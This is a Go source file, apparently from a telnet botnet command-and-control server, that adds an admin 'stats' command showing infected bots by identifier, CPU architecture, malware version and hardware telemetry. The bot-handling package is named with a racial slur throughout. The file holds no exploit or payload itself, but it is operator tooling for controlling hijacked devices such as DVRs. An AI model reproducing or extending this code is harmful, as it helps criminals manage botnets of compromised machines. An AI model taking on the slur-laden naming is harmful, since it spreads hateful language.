package admin

import (
	"advanced-telnet-cnc/packages/pflag"
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/niggers"
	slavev2 "advanced-telnet-cnc/source/niggers/v2"
	"fmt"
	"strconv"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"stats", "bots", "botcount", "statistics"},
		Description: "Displays statistics related to the bots in the network.",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			var identifiers, arches, versions, hardware bool
			var searchQuery string

			flagSet := pflag.NewFlagSet("stats", pflag.ContinueOnError)
			flagSet.SetOutput(session.Conn)

			flagSet.BoolVarP(&identifiers, "identifiers", "i", false, "View bots by identifier. (ex. DVR)")
			flagSet.BoolVarP(&arches, "architecture", "a", false, "View bots by architecture. (ex. MIPS)")
			flagSet.BoolVarP(&versions, "versions", "v", false, "View bots by malware versions. (ex. 2.0.0)")
			flagSet.BoolVarP(&hardware, "hardware", "H", false, "View hardware telemetry. (CPU/RAM)")
			flagSet.StringVarP(&searchQuery, "search", "s", "", "Search for a specific bot type.")

			err := flagSet.Parse(args)
			if err != nil {
				if err == pflag.ErrHelp {
					return nil
				}
				return session.Println(config.Red, "Could not parse command flags.")
			}

			if arches {
				return ArchesCount(session, searchQuery)
			} else if versions {
				return VersionsCount(session, searchQuery)
			} else if hardware {
				return HardwareTelemetry(session, searchQuery)
			} else {
				return IdentifierCount(session, searchQuery)
			}
		},
	})
}

func HardwareTelemetry(session *sessions.Session, searchQuery string) error {
	slavev2.List.Mutex.Lock()
	defer slavev2.List.Mutex.Unlock()

	if len(slavev2.List.Clients) == 0 {
		return session.Println("No bots connected.")
	}

	table := simpletable.New()
	table.Header = &simpletable.Header{
		Cells: []*simpletable.Cell{
			{Align: simpletable.AlignCenter, Text: "ID"},
			{Align: simpletable.AlignCenter, Text: "Arch"},
			{Align: simpletable.AlignCenter, Text: "Cores"},
			{Align: simpletable.AlignCenter, Text: "RAM"},
			{Align: simpletable.AlignCenter, Text: "Source"},
		},
	}

	count := 0
	for _, v := range slavev2.List.Clients {
		if count >= 20 { // Limit to 20 for readability
			break
		}
		if searchQuery != "" && !strings.Contains(strings.ToLower(v.Source), strings.ToLower(searchQuery)) {
			continue
		}

		table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
			{Text: strconv.Itoa(v.ID)},
			{Text: v.Arch},
			{Text: v.Cores},
			{Text: v.RAM + "MB"},
			{Text: v.Source},
		})
		count++
	}

	table.SetStyle(simpletable.StyleCompactLite)
	session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
	return nil
}

func IdentifierCount(session *sessions.Session, searchQuery string) error {
	distribution := niggers.Distribution()
	if len(distribution) == 0 {
		return session.Println("No bots connected.")
	}

	table := simpletable.New()
	table.Header = &simpletable.Header{
		Cells: []*simpletable.Cell{
			{Align: simpletable.AlignCenter, Text: "Identifier"},
			{Align: simpletable.AlignCenter, Text: "Count"},
			{Align: simpletable.AlignCenter, Text: "Change"},
		},
	}

	for s, count := range distribution {
		if !strings.HasPrefix(strings.ToLower(s), strings.ToLower(searchQuery)) {
			continue
		}

		old, exists := session.OldDistribution[s]
		difference := count - old
		differenceSymbol := ""
		if exists && difference != 0 {
			if difference > 0 {
				differenceSymbol = fmt.Sprintf("\u001B[92m+%d", difference)
			} else {
				differenceSymbol = fmt.Sprintf("\u001B[91m%d", difference)
			}
		} else if !exists {
			differenceSymbol = fmt.Sprintf("\u001B[92m+%d", count)
		} else {
			differenceSymbol = "\u001B[97m0"
		}

		table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
			{Text: s},
			{Text: strconv.Itoa(count)},
			{Text: differenceSymbol},
		})
	}

	table.SetStyle(simpletable.StyleCompactLite)
	session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))

	session.OldDistribution = niggers.Distribution()

	return nil
}

func ArchesCount(session *sessions.Session, searchQuery string) error {
	arches := niggers.Arches()
	if len(arches) == 0 {
		return session.Println("No bots connected.")
	}

	table := simpletable.New()
	table.Header = &simpletable.Header{
		Cells: []*simpletable.Cell{
			{Align: simpletable.AlignCenter, Text: "Architecture"},
			{Align: simpletable.AlignCenter, Text: "Count"},
			{Align: simpletable.AlignCenter, Text: "Change"},
		},
	}

	for s, count := range arches {
		if !strings.HasPrefix(strings.ToLower(s), strings.ToLower(searchQuery)) {
			continue
		}

		old, exists := session.OldArches[s]
		difference := count - old
		differenceSymbol := ""
		if exists && difference != 0 {
			if difference > 0 {
				differenceSymbol = fmt.Sprintf("\u001B[92m+%d", difference)
			} else {
				differenceSymbol = fmt.Sprintf("\u001B[91m%d", difference)
			}
		} else if !exists {
			differenceSymbol = fmt.Sprintf("\u001B[92m+%d", count)
		} else {
			differenceSymbol = "\u001B[97m0"
		}

		table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
			{Text: s},
			{Text: strconv.Itoa(count)},
			{Text: differenceSymbol},
		})
	}

	table.SetStyle(simpletable.StyleCompactLite)
	session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))

	session.OldArches = niggers.Arches()

	return nil
}

func VersionsCount(session *sessions.Session, searchQuery string) error {
	versions := niggers.Versions()
	if len(versions) == 0 {
		return session.Println("No bots connected.")
	}

	table := simpletable.New()
	table.Header = &simpletable.Header{
		Cells: []*simpletable.Cell{
			{Align: simpletable.AlignCenter, Text: "Version"},
			{Align: simpletable.AlignCenter, Text: "Count"},
			{Align: simpletable.AlignCenter, Text: "Change"},
		},
	}

	for s, count := range versions {
		if !strings.HasPrefix(strings.ToLower(s), strings.ToLower(searchQuery)) {
			continue
		}

		old, exists := session.OldVersions[s]
		difference := count - old
		differenceSymbol := ""
		if exists && difference != 0 {
			if difference > 0 {
				differenceSymbol = fmt.Sprintf("\u001B[92m+%d", difference)
			} else {
				differenceSymbol = fmt.Sprintf("\u001B[91m%d", difference)
			}
		} else if !exists {
			differenceSymbol = fmt.Sprintf("\u001B[92m+%d", count)
		} else {
			differenceSymbol = "\u001B[97m0"
		}

		table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
			{Text: s},
			{Text: strconv.Itoa(count)},
			{Text: differenceSymbol},
		})
	}

	table.SetStyle(simpletable.StyleCompactLite)
	session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))

	session.OldVersions = niggers.Versions()

	return nil
}
